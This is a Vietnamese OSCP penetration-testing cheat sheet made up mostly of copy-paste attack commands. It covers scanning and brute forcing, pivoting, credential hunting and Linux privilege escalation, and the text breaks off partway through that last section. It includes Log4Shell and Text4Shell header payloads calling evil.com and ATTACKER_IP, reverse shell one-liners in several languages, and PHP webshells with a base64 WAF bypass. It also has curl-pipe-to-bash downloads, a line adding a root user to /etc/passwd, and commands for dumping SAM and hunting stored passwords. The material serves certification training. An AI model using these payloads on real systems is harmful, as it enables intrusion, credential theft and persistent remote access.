# 🔥 OSCP PEN-200 CHEAT SHEET — KHÔNG DÙNG AI KHI THI
> Tổng hợp mindset + lệnh cụ thể + nguồn tool. Học thuộc, copy-paste khi thi.

---

## 📋 MỤC LỤC
1. [Mindset & Google Search Methodology](#mindset)
2. [Enumeration — Quét không bỏ sót](#enumeration)
3. [Tìm file ẩn / Hidden Content (kể cả log4shell, text4shell)](#hidden-files)
4. [Tìm CVE & Exploit](#cve-search)
5. [Default Credentials — Thử user=pass](#default-creds)
6. [Upload Shell / Reverse Shell](#shell)
7. [Chuyển file lên/xuống target](#file-transfer)
8. [SSH Key — Gen & Deploy](#ssh-key)
9. [Chisel — Tunnel & Pivoting](#chisel)
10. [Ligolo-ng — Pivoting VPN-style](#ligolo)
11. [Port Forwarding tổng hợp](#port-forward)
12. [FTP — Binary/ASCII Mode](#ftp)
13. [Base64 PHP — Lưu file](#base64-php)
14. [Credentials Hunting — Tìm pass ở đâu?](#creds-hunting)
15. [Privilege Escalation Linux](#privesc-linux)
16. [Privilege Escalation Windows](#privesc-windows)
17. [Active Directory — Mindset & Commands](#active-directory)
18. [Nmap Static Binary](#nmap-static)
19. [Lưu ý thi OSCP](#exam-tips)

---

## 1. MINDSET & GOOGLE SEARCH METHODOLOGY {#mindset}

### Mindset cốt lõi
- **Enumerate trước, exploit sau** — không bao giờ skip bước quét
- **Nếu stuck > 20 phút** → quét lại port, path khác, service khác
- **Try Harder** = thử hướng khác, không phải thử lại cùng hướng
- **Luôn ghi note** mọi thứ: IP, port, user, pass, path, hash

### Google Search Template
```
# Tìm exploit theo service + version
"<service> <version> exploit"
"<service> <version> RCE"
"<service> <version> CVE"

# Ví dụ cụ thể
"Apache 2.4.49 path traversal exploit"
"CMS Made Simple 2.2.9 SQLi"
"OpenNetAdmin 18.1.1 RCE github"
"vBulletin 5.6.2 RCE exploit"

# Tìm default creds
"<platform/service> default credentials"
"<device model> default password"

# Tìm privesc
"<OS version> local privilege escalation"
"sudo <command> privilege escalation"
"SUID <binary> exploit GTFOBins"
```

### Nguồn tìm exploit
| Nguồn | URL |
|-------|-----|
| ExploitDB | https://www.exploit-db.com |
| searchsploit | `searchsploit <keyword>` (offline) |
| GitHub | `site:github.com <service> exploit` |
| HackTricks | https://book.hacktricks.xyz |
| GTFOBins | https://gtfobins.github.io |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PoC in GitHub | https://github.com/nomi-sec/PoC-in-GitHub |
| CVEdetails | https://www.cvedetails.com |

---

## 2. ENUMERATION — QUÉT KHÔNG BỎ SÓT {#enumeration}

### Nmap — Full scan bài bản
```bash
# Bước 1: Quét nhanh tất cả port
nmap -p- --min-rate 5000 -T4 <IP> -oN ports.txt

# Bước 2: Quét chi tiết port đã mở
nmap -sC -sV -p 22,80,443,... <IP> -oN detail.txt

# Bước 3: UDP (đừng bỏ!)
nmap -sU --top-ports 100 <IP> -oN udp.txt

# Bước 4: Script vuln
nmap --script=vuln -p 80,443 <IP>

# One-liner đầy đủ
nmap -sC -sV -p- --min-rate 5000 -oA nmap_full <IP>
```

### Web Enumeration
```bash
# Gobuster dirs
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 50

# Gobuster với extension đầy đủ hơn
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak,old,zip,tar,gz,log,xml,json,conf,config,yml,yaml -t 40

# Feroxbuster (nhanh hơn)
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html,bak -t 50 --depth 3

# FFUF
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403

# Virtual Host fuzzing
ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301

# Nikto
nikto -h http://<IP>

# WhatWeb
whatweb http://<IP>
```

### SMB Enumeration
```bash
# Liệt kê shares
smbclient -L //<IP> -N
smbclient -L //<IP> -U 'user%pass'

# Connect share
smbclient //<IP>/ShareName -N
smbclient //<IP>/ShareName -U 'user%pass'

# Enum4linux
enum4linux -a <IP>
enum4linux-ng -A <IP>   # https://github.com/cddmp/enum4linux-ng

# CrackMapExec
crackmapexec smb <IP>
crackmapexec smb <IP> -u 'user' -p 'pass' --shares
crackmapexec smb <IP> -u 'user' -p 'pass' --users
crackmapexec smb <IP> -u '' -p '' --shares  # null session

# nmap smb scripts
nmap --script=smb-enum-shares,smb-enum-users -p 445 <IP>
```

### SNMP
```bash
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25  # Windows users
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
```

### RPC / LDAP
```bash
rpcclient -U "" -N <IP>
rpcclient> enumdomusers
rpcclient> enumdomgroups

# LDAP
ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com"
ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com" -D 'user@domain.com' -w 'pass'
```

---

## 3. TÌM FILE ẨN / HIDDEN CONTENT {#hidden-files}

### Lý do bỏ sót file ẩn với gobuster thông thường
> **Text4Shell (CVE-2022-42889)**, Log4Shell, và nhiều vuln khác **không có endpoint rõ ràng** — phải fuzz parameter, header, path đặc biệt.

### Fuzz parameter ẩn
```bash
# Arjun — tìm hidden GET/POST parameter
# https://github.com/s0md3v/Arjun
arjun -u http://<IP>/endpoint -m GET
arjun -u http://<IP>/endpoint -m POST
arjun -u http://<IP>/endpoint -m JSON

# x8 — HTTP parameter discovery
# https://github.com/Sh1Yo/x8
x8 -u http://<IP>/endpoint -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# FFUF fuzz parameter
ffuf -u "http://<IP>/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

### Fuzz header để trigger Log4Shell / Text4Shell
```bash
# Text4Shell (CVE-2022-42889) — trigger qua User-Agent, header
# https://github.com/kljunowsky/CVE-2022-42889-text4shell
curl -H 'User-Agent: ${script:https://evil.com/payload}' http://<IP>/
curl -H 'X-Forwarded-For: ${script:https://evil.com/x}' http://<IP>/

# Log4Shell (CVE-2021-44228) — fuzz mọi input field
curl -H 'User-Agent: ${jndi:ldap://ATTACKER_IP:1389/x}' http://<IP>/
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/x}' http://<IP>/
# Username field, search field, Contact form... đều có thể vulnerable!

# Dùng nuclei để tự động scan
nuclei -u http://<IP> -t ~/nuclei-templates/cves/
nuclei -u http://<IP> -t ~/nuclei-templates/cves/2022/CVE-2022-42889.yaml
nuclei -u http://<IP> -t ~/nuclei-templates/cves/2021/CVE-2021-44228.yaml
```

### Tìm backup file, file nhạy cảm
```bash
# Gobuster với extension backup
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt \
  -x php,php.bak,php~,bak,old,swp,orig,save,txt,zip,tar,gz,sql,db,conf,config,yml,yaml,json,xml,log

# Tìm git repo ẩn
# https://github.com/internetwache/GitTools
git-dumper http://<IP>/.git ./dumped_git

# .DS_Store / .env / .htaccess
curl http://<IP>/.env
curl http://<IP>/.htaccess
curl http://<IP>/wp-config.php.bak
curl http://<IP>/config.php.bak
curl http://<IP>/.git/config
```

### Scan với extension đặc biệt cho CMS
```bash
# WordPress
wpscan --url http://<IP> --enumerate u,p,t,vp --api-token <TOKEN>

# Joomla
joomscan -u http://<IP>

# Drupal
droopescan scan drupal -u http://<IP>
```

---

## 4. TÌM CVE & EXPLOIT {#cve-search}

### searchsploit (offline — quan trọng khi thi!)
```bash
searchsploit <keyword>
searchsploit apache 2.4
searchsploit "cms made simple" 2.2
searchsploit -m <exploit_id>        # copy exploit về thư mục hiện tại
searchsploit -x <exploit_id>        # xem nội dung exploit
searchsploit --nmap nmap_full.xml   # tự động tìm theo nmap output
```

### Tìm CVE theo version
```bash
# Pattern google
"<service> <exact_version> exploit site:exploit-db.com"
"<service> <exact_version> RCE github"
"CVE <service> <year>"

# Ví dụ thực tế
# Webmin 1.890 → CVE-2019-15107 (RCE unauth)
# Apache Struts 2.3.5-2.3.31 → CVE-2017-5638 (EternalBlue-like RCE)
# CMS Made Simple < 2.2.10 → CVE-2019-9053 (SQLi)
# vBulletin 5.x → CVE-2020-17496 (RCE unauth)
```

---

## 5. DEFAULT CREDENTIALS {#default-creds}

### ⚡ Thử user=pass NGAY LÚC đầu — hay bị bỏ qua!
```
admin:admin
admin:password
admin:admin123
admin:1234
root:root
root:toor
root:password
user:user
test:test
guest:guest
administrator:administrator
```

### Credentials theo nền tảng
| Service/Platform | Default Creds |
|-----------------|---------------|
| FTP | anonymous:anonymous |
| Tomcat | tomcat:tomcat / admin:admin / tomcat:s3cret |
| Jenkins | admin:admin / admin:password |
| Joomla | admin:admin |
| WordPress | admin:admin / admin:password |
| Drupal | admin:admin |
| phpMyAdmin | root: (blank) / root:root |
| MySQL | root: (blank) |
| MSSQL | sa:sa / sa:password |
| Mongo | (no auth by default) |
| Redis | (no auth by default) |
| CouchDB | admin:admin |
| Grafana | admin:admin |
| Kibana | elastic:changeme |
| Webmin | admin:admin |
| pfSense | admin:pfsense |
| VMware vCenter | administrator@vsphere.local:VMware1! |
| Cisco | cisco:cisco / admin:cisco |
| SNMP | community: public / private |
| Printer (HP) | admin:admin / admin: (blank) |
| NetGear | admin:password |
| ProFTPd | anonymous:email |

### Brute force
```bash
# Hydra HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"

# Hydra SSH
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>

# Hydra FTP
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<IP>

# Hydra SMB
hydra -l <user> -P /usr/share/wordlists/rockyou.txt smb://<IP>

# CrackMapExec spray password
crackmapexec smb <IP> -u users.txt -p 'Password123'
crackmapexec ssh <IP> -u users.txt -p 'Password123'
```

---

## 6. UPLOAD SHELL / REVERSE SHELL {#shell}

### Reverse Shell one-liners (copy-paste khi thi)
```bash
# Bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &

# Netcat
nc -e /bin/sh ATTACKER_IP 4444
nc ATTACKER_IP 4444 -e /bin/bash

# Netcat (không có -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Listener
```bash
# Netcat listener
nc -lvnp 4444

# Pwncat (tốt hơn nc, tự upgrade TTY)
pwncat-cs -lp 4444
```

### Upgrade TTY sau khi có shell
```bash
# Method 1: Python pty
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Sau đó: Ctrl+Z → stty raw -echo; fg → Enter 2 lần
stty raw -echo; fg
# Rồi set terminal
export TERM=xterm-256color
stty rows 50 cols 200

# Method 2: script
script /dev/null -c bash

# Method 3: socat
# Trên Kali: socat file:`tty`,raw,echo=0 tcp-listen:4444
# Trên target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

### PHP Webshell upload
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

```bash
# Upload via curl
curl -F "file=@shell.php" http://<IP>/upload.php
# Exec
curl "http://<IP>/uploads/shell.php?cmd=id"
curl "http://<IP>/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

### msfvenom payloads
```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php

# ASP/ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx
```

---

## 7. CHUYỂN FILE LÊN/XUỐNG TARGET {#file-transfer}

### HTTP Server (Kali side)
```bash
# Python HTTP server
python3 -m http.server 8080
python3 -m http.server 80  # cần sudo

# PHP server
php -S 0.0.0.0:8080

# Updog (upload + download)
# pip install updog
updog -p 8080
```

### Download về target (Linux)
```bash
wget http://ATTACKER_IP:8080/file.sh -O /tmp/file.sh
curl http://ATTACKER_IP:8080/file.sh -o /tmp/file.sh
curl http://ATTACKER_IP:8080/file.sh | bash  # exec trực tiếp

# Nếu không có wget/curl
fetch http://ATTACKER_IP:8080/file.sh   # FreeBSD
nc -nv ATTACKER_IP 4444 > file         # via netcat
```

### Download về target (Windows)
```powershell
# PowerShell
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file.exe','C:\Windows\Temp\file.exe')
iwr http://ATTACKER_IP/file.exe -OutFile C:\Windows\Temp\file.exe
Invoke-WebRequest http://ATTACKER_IP/file.exe -OutFile C:\Windows\Temp\file.exe

# CertUtil
certutil.exe -urlcache -split -f http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe

# Bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe
```

### SCP
```bash
# Copy từ Kali lên target
scp /path/to/file user@TARGET_IP:/tmp/file

# Copy từ target về Kali
scp user@TARGET_IP:/etc/passwd /tmp/passwd_target

# Copy với port tùy chỉnh
scp -P 2222 file user@TARGET_IP:/tmp/

# Copy thư mục
scp -r /local/dir user@TARGET_IP:/remote/dir
```

### SMB Server (upload xuống Windows)
```bash
# Kali: Impacket SMB server
impacket-smbserver share /path/to/share -smb2support
impacket-smbserver share . -smb2support -username user -password pass

# Windows target download
copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\file.exe
# hoặc PowerShell
(New-Object Net.WebClient).DownloadFile('\\ATTACKER_IP\share\file.exe','C:\Windows\Temp\file.exe')
```

### Base64 encode/decode transfer
```bash
# Kali: encode file
base64 -w 0 /path/to/file.elf

# Target: decode
echo "BASE64STRING..." | base64 -d > /tmp/file.elf
chmod +x /tmp/file.elf
```

---

## 8. SSH KEY — GEN & DEPLOY {#ssh-key}

### Tạo SSH key pair
```bash
# Tạo key
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_oscp -N ""
# → tạo id_oscp (private) và id_oscp.pub (public)

# Hoặc không cần passphrase
ssh-keygen -t ed25519 -f /tmp/mykey -N ""
```

### Đẩy public key lên server (khi có RCE/shell)
```bash
# Method 1: Echo vào authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAA...YOUR_PUBLIC_KEY... kali@kali" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Method 2: Dùng SSH copy (nếu có password)
ssh-copy-id -i ~/.ssh/id_oscp.pub user@TARGET_IP

# Method 3: Qua curl khi HTTP server đang chạy
curl http://ATTACKER_IP:8080/id_oscp.pub >> ~/.ssh/authorized_keys
```

### SSH vào sau khi đẩy key
```bash
ssh -i ~/.ssh/id_oscp user@TARGET_IP
ssh -i /tmp/mykey user@TARGET_IP -p 22
```

### Đọc private key từ target và dùng
```bash
# Nếu tìm thấy /home/user/.ssh/id_rsa trên target
cat /home/user/.ssh/id_rsa
# Copy về Kali
chmod 600 id_rsa_found
ssh -i id_rsa_found user@TARGET_IP
```

---

## 9. CHISEL — TUNNEL & PIVOTING {#chisel}

> **Source:** https://github.com/jpillora/chisel

### Cài & chuẩn bị
```bash
# Trên Kali — cài sẵn hoặc download
sudo apt install chisel
# Hoặc download binary từ: https://github.com/jpillora/chisel/releases

# Phải có binary trên cả Kali VÀ target!
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel
# Chuyển lên target qua HTTP/SCP
```

### Reverse SOCKS Proxy (phổ biến nhất trong OSCP)
```bash
# Kali (attacker) — chạy server lắng nghe
./chisel server -p 8989 --reverse --socks5

# Target (compromised) — kết nối về Kali
./chisel client ATTACKER_IP:8989 R:1080:socks &

# Kali — cấu hình proxychains
# /etc/proxychains4.conf → thêm dòng cuối:
socks5 127.0.0.1 1080

# Dùng với proxychains
proxychains nmap -sT -p 445,80,443 10.10.10.5
proxychains curl http://10.10.10.5
proxychains crackmapexec smb 10.10.10.0/24
```

### Forward SOCKS Proxy (khi target accessible)
```bash
# Target — chạy server
./chisel server -p 8989 --socks5

# Kali — kết nối đến target
./chisel client TARGET_IP:8989 1080:socks
```

### Port Forward cụ thể (không cần SOCKS)
```bash
# Truy cập port 3306 (MySQL) của 10.10.10.5 qua target
# Target:
./chisel client ATTACKER_IP:8989 R:3306:10.10.10.5:3306 &

# Kali — giờ có thể connect
mysql -h 127.0.0.1 -P 3306 -u root

# Forward RDP (3389)
# Target:
./chisel client ATTACKER_IP:8989 R:3389:127.0.0.1:3389 &
# Kali:
xfreerdp /u:Administrator /p:pass /v:127.0.0.1:3389
```

### Double pivot (2 lớp mạng)
```bash
# Mạng: Kali → pivot1 → pivot2 → internal_target

# Bước 1: Kali setup
./chisel server -p 8989 --reverse --socks5

# Bước 2: pivot1 kết nối về Kali
./chisel client KALI_IP:8989 R:2222:127.0.0.1:2222 &

# Bước 3: pivot1 chạy chisel server mới
./chisel server -p 2222 --reverse --socks5

# Bước 4: pivot2 kết nối về pivot1
./chisel client PIVOT1_IP:2222 R:1081:socks &

# Kali proxychains qua port 1081
```

---

## 10. LIGOLO-NG — PIVOTING VPN-STYLE {#ligolo}

> **Source:** https://github.com/nicocha30/ligolo-ng  
> **Ưu điểm:** Không cần SOCKS/proxychains — route traffic trực tiếp như VPN

### Cài đặt
```bash
# Kali
sudo apt install ligolo-ng -y
# Hoặc download từ: https://github.com/nicocha30/ligolo-ng/releases

# Cần có:
# - proxy  → chạy trên Kali
# - agent  → chạy trên target (Linux/Windows)

# Download agent cho Windows
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip

# Download agent cho Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz
```

### Setup từng bước

```bash
# BƯỚC 1: Tạo TUN interface trên Kali (1 lần duy nhất)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# BƯỚC 2: Chạy proxy trên Kali
./proxy -selfcert -laddr 0.0.0.0:11601

# BƯỚC 3: Chuyển agent lên target, rồi chạy
# Linux target:
./agent -connect KALI_IP:11601 -ignore-cert &
# Windows target:
agent.exe -connect KALI_IP:11601 -ignore-cert

# BƯỚC 4: Trên Ligolo console (Kali side)
ligolo-ng » session          # chọn session
ligolo-ng » ifconfig         # xem interface của target
ligolo-ng » start            # bắt đầu tunnel

# BƯỚC 5: Thêm route trên Kali để đến internal subnet
sudo ip route add 192.168.100.0/24 dev ligolo
# 192.168.100.0/24 là subnet của target internal network

# BƯỚC 6: Giờ có thể dùng tool trực tiếp KHÔNG cần proxychains!
nmap -sT -p- 192.168.100.5
curl http://192.168.100.10
crackmapexec smb 192.168.100.0/24
```

### Ligolo listener (mở port nghe trên target — dùng cho reverse shell từ subnet nội bộ)
```bash
# Trong ligolo console:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Giờ target lắng nghe port 4444, khi internal machine connect → forward về Kali 4444
```

### Multi-hop với Ligolo-ng
```bash
# Pivot1 đã kết nối → thêm route đến subnet của pivot1
sudo ip route add 10.10.10.0/24 dev ligolo

# Chạy agent trên Pivot2 (qua Pivot1)
# → Thêm session mới
# → start
# → ip route add 172.16.0.0/24 dev ligolo
```

---

## 11. PORT FORWARDING TỔNG HỢP {#port-forward}

### SSH Local Port Forward
```bash
# Truy cập INTERNAL_HOST:PORT qua SSH tunnel
ssh -L LOCAL_PORT:INTERNAL_HOST:REMOTE_PORT user@SSH_PIVOT -N -f
# Ví dụ: truy cập internal web 192.168.1.10:80 qua pivot
ssh -L 8080:192.168.1.10:80 user@PIVOT_IP -N -f
# → Truy cập http://127.0.0.1:8080 từ Kali
```

### SSH Remote Port Forward
```bash
# Nhận reverse shell từ internal target qua pivot
ssh -R 4444:127.0.0.1:4444 user@PIVOT_IP -N -f
# → Internal target kết nối về PIVOT:4444 → forward về Kali:4444
```

### SSH Dynamic (SOCKS)
```bash
ssh -D 1080 user@PIVOT_IP -N -f
# → Dùng proxychains với socks5 127.0.0.1 1080
```

### SSHuttle (đơn giản nhất)
```bash
sshuttle -r user@PIVOT_IP 10.10.10.0/24
sshuttle -r user@PIVOT_IP 10.10.10.0/24 192.168.1.0/24
# Dùng key: sshuttle -r user@PIVOT_IP -e 'ssh -i id_rsa' 10.0.0.0/8
```

### Metasploit port forward
```bash
meterpreter> run post/multi/manage/autoroute SUBNET=10.10.10.0/24
meterpreter> portfwd add -l 3389 -p 3389 -r 10.10.10.5
```

---

## 12. FTP {#ftp}

```bash
# Kết nối
ftp <IP>
ftp -n <IP>   # không auto login

# Sau khi login
ftp> ls
ftp> ls -la   # hiện file ẩn
ftp> cd /path
ftp> get file.txt          # download
ftp> mget *.txt            # download nhiều file
ftp> put shell.php         # upload
ftp> mput *.php            # upload nhiều file

# Binary mode (cho file binary: exe, zip, images...)
ftp> binary
ftp> get shell.exe
# QUAN TRỌNG: Nếu transfer exe/zip mà không dùng binary → file bị corrupt!

# ASCII mode (cho file text: txt, sh, php...)
ftp> ascii
ftp> get file.txt

# Passive mode (firewall issues)
ftp> passive

# Recursive download
wget -r ftp://user:pass@<IP>/
```

---

## 13. BASE64 PHP — LƯU FILE {#base64-php}

### Encode file PHP để bypass filter
```bash
# Kali: encode webshell
cat shell.php | base64 -w 0
# Output: PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Target: decode và lưu file
echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+" | base64 -d > /var/www/html/uploads/shell.php
```

### PHP exec base64 bypass (khi WAF block từ khóa)
```php
# Shell được encode, gọi eval(base64_decode(...))
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>

# Encode payload trực tiếp
php -r "echo base64_encode('system(\$_GET[\"cmd\"]);');"
```

### Lưu binary qua PHP web shell
```bash
# Kali: convert chisel thành base64
base64 -w 0 chisel > chisel.b64

# Dùng web shell để decode và lưu
curl "http://<IP>/shell.php?cmd=echo+LARGEB64STRING+|+base64+-d+>/tmp/chisel"
curl "http://<IP>/shell.php?cmd=chmod+%2Bx+/tmp/chisel"
```

---

## 14. CREDENTIALS HUNTING {#creds-hunting}

### Linux — Tìm credentials

#### Thư mục quan trọng PHẢI check
```bash
# Config web server
cat /etc/apache2/sites-enabled/*.conf
cat /etc/nginx/sites-enabled/*.conf
cat /var/www/html/wp-config.php          # WordPress
cat /var/www/html/config.php
cat /var/www/html/.env
cat /var/www/html/application/config/database.php  # CodeIgniter

# App configs
cat /opt/*/config*
cat /opt/*/settings*
ls -la /opt/
ls -la /var/www/

# Database files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
find / -name "*.sql" 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# History files (VÀNG!)
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
cat /root/.bash_history

# /tmp và /var/tmp
ls -la /tmp/
ls -la /var/tmp/
ls -la /dev/shm/

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*
crontab -l

# /var/log
ls -la /var/log/
cat /var/log/auth.log
cat /var/log/syslog

# Backup files
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
find / -name "*password*" 2>/dev/null
find / -name "*passwd*" 2>/dev/null
find / -name "*secret*" 2>/dev/null
find / -name "*credential*" 2>/dev/null

# /proc — xem process arguments (đôi khi có pass!)
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' '

# Môi trường của process đang chạy
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
```

#### /etc/passwd và shadow
```bash
cat /etc/passwd
cat /etc/shadow  # cần root
cat /etc/group

# Nếu có shadow, crack bằng john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt  # sha512crypt
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt   # md5crypt
```

### Windows — Tìm credentials

```powershell
# Registry — Windows creds
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # AutoLogon!

# Unattended install files
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\sysprep\sysprep.xml
type C:\Windows\System32\sysprep.inf
type C:\sysprep.inf

# Web config
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

# File history / cmdline
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Credential Manager
cmdkey /list
# Dùng với runas nếu có creds:
runas /savedcred /user:DOMAIN\user cmd.exe

# SAM dump (cần SYSTEM)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Kali: impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# Plaintext passwords trong file
findstr /si password *.txt *.ini *.config *.xml
findstr /spin "password" *.*

# Known locations
type C:\Program Files\FileZilla Server\FileZilla Server.xml
type C:\ProgramData\MySQL\MySQL Server 5.6\my.ini
type C:\xampp\php\php.ini
dir /s *pass* == *cred* == *vnc* == *.config* 2>nul
```

---

## 15. PRIVILEGE ESCALATION LINUX {#privesc-linux}

### Checklist thứ tự (KHÔNG bỏ bước nào!)

```bash
# 0. Thông tin cơ bản
id; whoami; uname -a; cat /etc/os-release; hostname; ip a

# 1. Sudo
sudo -l  # ⭐ Check TRƯỚC TIÊN — rất hay ra kết quả
# → Nếu có binary → tìm trên GTFOBins: https://gtfobins.github.io

# 2. SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# → Check GTFOBins

# 3. CRON jobs
cat /etc/crontab
ls -la /etc/cron.*
find / -name "*.sh" -writable 2>/dev/null
# Nếu script trong cron writable → thêm reverse shell vào!

# 4. SUID exploit examples
# /usr/bin/find → find . -exec /bin/sh \; -quit
# /usr/bin/vim  → vim -c ':!/bin/sh'
# /usr/bin/less → less /etc/passwd → !/bin/sh
# /usr/bin/nano → nano → Ctrl+R Ctrl+X → reset; sh 1>&0 2>&0
# /usr/bin/cp → cp /bin/sh /tmp/rootsh && chmod +s /tmp/rootsh

# 5. Writable files/dirs quan trọng
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
ls -la /etc/passwd  # nếu writable → thêm user root!
# echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd

# 6. PATH hijacking
echo $PATH
env  # check PYTHON env variables
# Nếu có script gọi command không có full path → tạo file giả cùng tên trong /tmp
# export PATH=/tmp:$PATH

# 7. Services chạy với root
ps aux | grep root
netstat -tulpn  # local services lắng nghe
ss -tulpn

# 8. Kernel exploits (last resort — dirty cow, pkexec, etc.)
uname -r
searchsploit "linux kernel $(uname -r)"
# DirtyPipe CVE-2022-0847 (kernel < 5.17)
# PwnKit CVE-2021-4034 (pkexec)
# Dirty COW CVE-2016-5195

# 9. NFS với no_root_squash
cat /etc/exports
showmount -e TARGET_IP
# Nếu có no_root_squash → mount và tạo SUID binary!

# 10. Capabilities
getcap -r / 2>/dev/null
